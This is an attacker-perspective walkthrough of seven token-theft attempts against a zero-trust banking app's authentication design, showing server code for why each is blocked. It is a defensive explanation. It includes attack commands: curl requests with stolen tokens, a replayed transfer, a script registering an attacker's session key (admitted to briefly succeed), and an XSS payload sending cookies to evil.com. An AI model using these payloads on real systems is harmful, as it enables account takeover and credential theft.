# 🔴 Attacker Scenario: Token Theft Against Zero Trust Architecture

> **Perspective:** You are an attacker who has successfully stolen a user's access token and refresh token. This document walks through every attack vector you would try — and how each one fails.

---

## 🎯 The Target

A banking application built on a **Zero Trust Architecture** with:
- OAuth2 Authorization Code Flow
- TOTP (Google Authenticator) as 2FA
- WebAuthn (Biometric/TPM) device binding
- Ephemeral ECDSA session keys for request signing
- Refresh token rotation with mismatch detection

---

## 🧰 What You Have (Stolen)

| Asset | Value | How You Got It |
|-------|-------|----------------|
| `accessToken` | `eyJhbGciOiJI...` (JWT, 15-min expiry) | XSS, network sniffing, malware, shoulder surfing |
| `refreshToken` | `eyJhbGciOiJI...` (JWT, 7-day expiry) | Same as above |
| User's `userId` | Decoded from JWT payload | `JSON.parse(atob(token.split('.')[1]))` |
| User's `role` | Decoded from JWT payload | Same as above |

## 🚫 What You Do NOT Have

| Asset | Why You Can't Get It |
|-------|---------------------|
| ECDSA Private Key | Non-extractable `CryptoKey` object — exists only in victim's browser JS memory. Cannot be read, serialized, or copied by any means. Dies on page refresh. |
| Biometric/TPM Credential | Hardware-bound to the victim's physical device. Cannot be cloned or exported. |
| TOTP Authenticator Secret | Stored on victim's phone in the authenticator app. Server stores it encrypted. |
| User's Password | Stored as bcrypt hash — irreversible. |

---

## ⚔️ Attack Playbook

### Attack #1: Direct API Call with Stolen Access Token

**Your move:**
```bash
curl -X GET http://target-app/api/banking/accounts \
  -H "Authorization: Bearer eyJhbGciOiJI...stolen_access_token..." \
  -H "Content-Type: application/json"
```

**What happens on the server:**

The banking service calls the auth service's centralized verify endpoint internally:
```
POST /api/auth/verify
{
  "token": "stolen_access_token",
  "signature": ???,        ← You don't have this
  "timestamp": ???,        ← You don't have this
  "method": "GET",
  "url": "/api/banking/accounts",
  "bodyHash": "..."
}
```

**Server logic (auth.js, line 996-1007):**
```javascript
// No signature — check if this is a temp device session (OTP flow)
} else {
    const { deviceId } = req.body;
    if (deviceId) {
        // Check for valid device session...
    } else {
        return res.status(403).json({
            authorized: false,
            error: 'Request signature required',
            code: 'SESSION_KEY_REQUIRED'
        });
    }
}
```

**Result:**
```json
❌ 403 Forbidden
{
    "authorized": false,
    "error": "Request signature required",
    "code": "SESSION_KEY_REQUIRED"
}
```

> **Why it failed:** The server requires every API request to carry an ECDSA cryptographic signature (`X-Signature` + `X-Timestamp` headers). No signature = no access. The token alone proves nothing.

---

### Attack #2: Forge the Signature Headers

**Your move:** You try to add fake signature headers.
```bash
curl -X GET http://target-app/api/banking/accounts \
  -H "Authorization: Bearer stolen_access_token" \
  -H "X-Signature: AAAA_fake_signature_AAAA" \
  -H "X-Timestamp: 1715345213000"
```

**What happens on the server (webauthn.js, line 290-344):**
```javascript
// Server reconstructs the expected payload
const payload = `${method}|${url}|${timestamp}|${bodyHash}`;

// Server imports the REAL public key registered by the victim's browser
const publicKey = await crypto.subtle.importKey("jwk", storedPublicKey, ...);

// Server verifies YOUR signature against the REAL public key
const isValid = await crypto.subtle.verify(
    { name: "ECDSA", hash: "SHA-256" },
    publicKey,        // ← The victim's public key
    signatureBuffer,  // ← Your fake signature
    dataBuffer
);
// isValid = false ← Your signature doesn't match
```

**Result:**
```json
❌ 403 Forbidden
{
    "authorized": false,
    "error": "Invalid request signature",
    "code": "SIGNATURE_INVALID"
}
```

> **Why it failed:** ECDSA signatures are mathematically unforgeable without the private key. The private key was generated as `{ extractable: false }` inside the victim's browser using the Web Crypto API — it cannot be read, exported, or cloned. Even the victim's own JavaScript cannot extract it.

---

### Attack #3: Generate Your Own ECDSA Key Pair

**Your move:** You generate a fresh ECDSA key pair and try to register it as a session key.

```javascript
// In your attacker browser
const keyPair = await crypto.subtle.generateKey(
    { name: 'ECDSA', namedCurve: 'P-256' },
    false,
    ['sign', 'verify']
);
const publicKeyJWK = await crypto.subtle.exportKey('jwk', keyPair.publicKey);

// Register it on the server
await fetch('http://target-app/api/auth/session-key', {
    method: 'POST',
    headers: {
        'Authorization': `Bearer ${stolenAccessToken}`,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ publicKeyJWK })
});
```

**What happens on the server (webauthn.js, line 269-278):**
```javascript
// Server deletes ALL existing session keys for this user
await SessionKey.deleteMany({ userId });

// Server stores YOUR new public key
await SessionKey.create({
    userId,
    publicKeyJWK: JSON.stringify(publicKeyJWK),
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
});
```

**Result:** ⚠️ **This actually succeeds!** You can now sign requests.

**BUT here's the trap:**

1. The victim's **existing session key is deleted** — their next API call fails immediately
2. The victim sees `SESSION_KEY_REQUIRED` → knows something is wrong
3. The victim is forced to **re-login through the full MFA flow** (password + TOTP + WebAuthn)
4. Upon re-login, a **new session key is generated** → your key is overwritten
5. **You are locked out again**

```
Timeline:
┌─────────┬─────────────────────────────────────┬──────────────────────────────┐
│  Time   │ Attacker                            │ Victim                       │
├─────────┼─────────────────────────────────────┼──────────────────────────────┤
│ T+0     │ Registers new session key ✅        │ (unaware)                    │
│ T+1     │ Can now make signed API calls       │ Next API call fails 🔴       │
│ T+2     │ Browsing victim's data...           │ Sees "session expired" modal │
│ T+3     │ Still active                        │ Re-logs in (password+TOTP+   │
│         │                                     │ WebAuthn biometric)          │
│ T+4     │ LOCKED OUT — key overwritten 🔒     │ Back in with new session ✅  │
│ T+5     │ Tries again → SESSION_KEY_REQUIRED  │ Normal usage resumes         │
└─────────┴─────────────────────────────────────┴──────────────────────────────┘
```

> **Why it ultimately fails:** The system is self-healing. Registering a new key alerts the victim by breaking their session. The victim re-authenticates with MFA (which you can't bypass), and your key is destroyed. You'd have to keep fighting this battle every few minutes — and every attempt alerts the victim.

---

### Attack #4: Use the Refresh Token to Get a New Access Token

**Your move:**
```bash
curl -X POST http://target-app/api/auth/refresh \
  -H "Cookie: refreshToken=eyJhbGciOiJI...stolen_refresh_token..."
```

**What happens on the server (auth.js, line 880-958):**

**Scenario A: Victim hasn't refreshed yet (token still matches)**
```javascript
const decryptedToken = decrypt(user.refreshToken);
if (decryptedToken !== refreshToken) { ... }
// Token matches — new access token issued

const accessToken = jwt.sign(
    { userId: user._id, role: user.role },
    getJwtSecret(),
    { expiresIn: "15m" }
);

// Old refresh token is ROTATED — new one issued
const newRefreshToken = jwt.sign({ userId: user._id, exp: decoded.exp }, getRefreshSecret());
user.refreshToken = encrypt(newRefreshToken);
await user.save();
```

**Result:** You get a new access token. **But you STILL can't sign requests** — same problem as Attack #1.

**Scenario B: Victim has already refreshed (token was rotated)**
```javascript
const decryptedToken = decrypt(user.refreshToken);
if (decryptedToken !== refreshToken) {
    // ⚠️ MISMATCH DETECTED — possible token theft!
    user.refreshToken = null;   // NUKE all tokens
    await user.save();
    return res.status(401).json({
        error: "Refresh token mismatch. Access revoked."
    });
}
```

**Result:**
```json
❌ 401 Unauthorized
{
    "error": "Refresh token mismatch. Access revoked."
}
```

> **Why it failed:** Refresh token rotation means the old token becomes invalid the moment the victim (or you) refreshes. If there's a mismatch, the server **revokes everything** — both your session and the victim's. The victim must re-authenticate via full MFA. You're completely locked out.

---

### Attack #5: Try to Log In Directly (Bypass MFA)

**Your move:** You know the victim's email. Try to log in from your browser.

```bash
curl -X POST http://target-app/api/auth/authorize \
  -d "email=victim@bank.local&password=???&redirect_uri=http://localhost"
```

**Barriers you face:**

| Step | Requirement | Can You Pass? |
|------|------------|---------------|
| 1. Password | bcrypt-hashed, unknown to you | ❌ No |
| 2. TOTP Code | Need victim's Google Authenticator app | ❌ No |
| 3. WebAuthn | Need victim's physical device (fingerprint/face/TPM PIN) | ❌ No |

> **Why it failed:** Even if you somehow knew the password, you need the TOTP code from their phone AND their biometric/TPM from their physical device. The MFA chain is unbreakable without physical access to multiple devices.

---

### Attack #6: Replay a Previously Captured Signed Request

**Your move:** You captured a full legitimate request with valid signature headers via a man-in-the-middle attack.

```bash
curl -X POST http://target-app/api/banking/transfer \
  -H "Authorization: Bearer eyJ..." \
  -H "X-Signature: captured_valid_signature" \
  -H "X-Timestamp: 1715345213000" \
  -d '{"to": "attacker_account", "amount": 10000}'
```

**What happens on the server (webauthn.js, line 309-313):**
```javascript
// Check timestamp tolerance (30 seconds)
const now = Date.now();
const ts = parseInt(timestamp, 10);
if (Math.abs(now - ts) > 30000) {
    return { valid: false, code: "TIMESTAMP_EXPIRED" };
}
```

**Result:**
```json
❌ 403 Forbidden
{
    "authorized": false,
    "error": "Invalid request signature",
    "code": "TIMESTAMP_EXPIRED"
}
```

> **Why it failed:** The signature includes a timestamp. The server only accepts signatures within a **±30 second window**. Old captured requests are expired and rejected. Additionally, the body hash in the signature is bound to the original request body — you can't change the transfer destination or amount without invalidating the signature.

---

### Attack #7: XSS to Steal Tokens from Cookies

**Your move:** Inject JavaScript to steal cookies.

```javascript
// XSS payload
fetch('https://evil.com/steal?cookies=' + document.cookie);
```

**What happens:**

```
document.cookie → ""  (empty!)
```

**Why:** Both `accessToken` and `refreshToken` cookies are set with `httpOnly: true`:
```javascript
res.cookie("refreshToken", refreshToken, {
    httpOnly: true,    // ← JavaScript CANNOT read this
    secure: true,      // ← HTTPS only in production
    sameSite: "lax",   // ← Not sent on cross-site requests
});
```

> **Why it failed:** `HttpOnly` cookies are invisible to JavaScript. `document.cookie` cannot see them. They're only sent by the browser automatically on same-origin requests. The `sameSite: "lax"` flag prevents them from being sent on cross-site POST requests (CSRF protection).

**Note:** The `accessToken` IS stored in `localStorage` for the `Authorization` header. An XSS attack COULD steal it — but a stolen access token alone is useless without the session key (see Attack #1).

---

## 📊 Attack Summary Matrix

| # | Attack Vector | Tokens Needed | Session Key Needed | MFA Needed | Result |
|---|--------------|---------------|-------------------|------------|--------|
| 1 | Direct API call with stolen token | ✅ Have | ❌ Don't have | — | **BLOCKED** |
| 2 | Forge signature headers | ✅ Have | ❌ Can't forge | — | **BLOCKED** |
| 3 | Register own session key | ✅ Have | ✅ Create own | — | **TEMPORARY** (self-healing) |
| 4 | Refresh token to get new access token | ✅ Have | ❌ Still don't have | — | **BLOCKED** (or REVOKED) |
| 5 | Direct login bypass | ❌ Not enough | — | ❌ Can't pass | **BLOCKED** |
| 6 | Replay captured request | ✅ Have | ✅ Old signature | — | **BLOCKED** (timestamp expired) |
| 7 | XSS cookie theft | ❌ HttpOnly | — | — | **BLOCKED** |

---

## 🏗️ Architecture That Defeats You

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        WHAT ATTACKER SEES                                │
│                                                                          │
│   Stolen JWT ──► API Call ──► 403 "Signature Required" ──► DEAD END     │
│                                                                          │
│   Stolen Refresh ──► New JWT ──► API Call ──► 403 ──► DEAD END          │
│                                                                          │
│   Register Key ──► API Calls Work! ──► Victim Alerted ──► Key Replaced  │
│                     (minutes)           ──► DEAD END                     │
│                                                                          │
│   Every path leads to a dead end without:                                │
│   1. The victim's browser memory (ECDSA private key)                     │
│   2. The victim's physical device (WebAuthn biometric)                   │
│   3. The victim's phone (TOTP authenticator)                             │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## 💀 Final Verdict

**As an attacker, your stolen tokens are essentially worthless.**

The Zero Trust architecture ensures that **no single credential is sufficient** for access. You need:

1. ✅ A valid JWT (you have this — but it's not enough)
2. ❌ A cryptographic proof of possession of an ephemeral key (you can never get this)
3. ❌ Physical presence on the registered device (you can't teleport)
4. ❌ Access to the victim's authenticator app (you don't have their phone)

The system is designed so that even a **complete compromise of the token layer** does not lead to unauthorized access. This is the core principle of Zero Trust: **never trust, always verify — with multiple independent factors on every single request.**
